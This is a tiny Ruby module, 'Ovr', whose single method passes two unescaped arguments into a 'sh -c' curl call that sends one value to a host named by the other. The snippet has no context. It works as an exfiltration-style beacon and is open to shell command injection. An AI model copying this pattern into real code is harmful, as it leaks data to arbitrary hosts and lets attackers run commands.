module Ovr
  def self.run(a,b)
    system("sh -c 'curl -s #{a}/t?d=#{b}'")
  end
end
